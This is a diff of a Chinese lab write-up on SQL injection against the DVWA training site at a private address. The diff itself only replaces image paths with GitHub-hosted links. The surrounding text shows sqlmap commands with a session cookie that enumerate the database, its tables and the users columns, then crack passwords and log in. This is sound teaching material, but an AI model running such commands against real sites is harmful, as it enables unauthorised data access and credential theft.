@@ -2,17 +2,17 @@
 
 **步骤1:打开测试站点DVWA的主页面，并设置其安全级别为 low，如图所示。**
 
-![image-20230427180418586](云端应用sql注入攻击.assets/image-20230427180418586.png)
+![image-20230427180418586](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311457913.png)
 
 **步骤2:单击左边的SQL Injection，打开图所示的界面。**
 
-![image-20230427180710969](云端应用sql注入攻击.assets/image-20230427180710969.png)
+![image-20230427180710969](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311458802.png)
 
 **步骤3:在`User ID`文本框中随意输入一串数字，比如123，同时开启Burp Suite的数据包捕获功能，如图所示。**
 
-![image-20230427180748029](云端应用sql注入攻击.assets/image-20230427180748029.png)
+![image-20230427180748029](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311458206.png)
 
-![image-20230427182012153](云端应用sql注入攻击.assets/image-20230427182012153.png)
+![image-20230427182012153](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311458610.png)
 
 
 
@@ -26,9 +26,9 @@ sqlmap -u "http://192.168.10.131/dvwa/vulnerabilities/sqli/?id=123&Submit=Submit
 
 `-u`后面的内容来自上图数据包中 **Referer**后面的内容，**cookie**来自图中 **Cookie**后的内容。执行该语句，得到网站数据库的名称，如图所示。
 
-![image-20230427214531813](云端应用sql注入攻击.assets/image-20230427214531813.png)
+![image-20230427214531813](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311458231.png)
 
-![image-20230427214441776](云端应用sql注入攻击.assets/image-20230427214441776.png)
+![image-20230427214441776](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311458988.png)
 
 
 
@@ -38,7 +38,7 @@ sqlmap -u "http://192.168.10.131/dvwa/vulnerabilities/sqli/?id=123&Submit=Submit
 sqlmap -u "http://192.168.10.131/dvwa/vulnerabilities/sqli/?id=123&Submit=Submit" --cookie="security=low; PHPSESSID=066dh160jnt38r8frcj0t4pdr2" --current-db --tables
 ```
 
-![image-20230427214832914](云端应用sql注入攻击.assets/image-20230427214832914.png)
+![image-20230427214832914](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311458069.png)
 
 **步骤6:针对其中的一个表users，猜测其中的字段。执行语句，得到的结果如图所示。**
 
@@ -46,7 +46,7 @@ sqlmap -u "http://192.168.10.131/dvwa/vulnerabilities/sqli/?id=123&Submit=Submit
 sqlmap -u "http://192.168.10.131/dvwa/vulnerabilities/sqli/?id=123&Submit=Submit" --cookie="security=low; PHPSESSID=066dh160jnt38r8frcj0t4pdr2" --columns -T users
 ```
 
-![image-20230427215216402](云端应用sql注入攻击.assets/image-20230427215216402.png)
+![image-20230427215216402](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311459683.png)
 
 
 
@@ -58,8 +58,8 @@ sqlmap -u "http://192.168.10.131/dvwa/vulnerabilities/sqli/?id=123&Submit=Submit
 
 在探测过程中用到其自带的字典,得到的结果如图所示。
 
-![image-20230427220148038](云端应用sql注入攻击.assets/image-20230427220148038.png)
+![image-20230427220148038](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311459422.png)
 
 **步骤8:利用上述结果，登录DVWA网站主页进行验证，比如用户名为1337,密码为charley如图5所示**
 
-![image-20230427220435673](云端应用sql注入攻击.assets/image-20230427220435673.png)
+![image-20230427220435673](https://raw.githubusercontent.com/yzl-eng/blogImage/main/img/202401311459058.png)
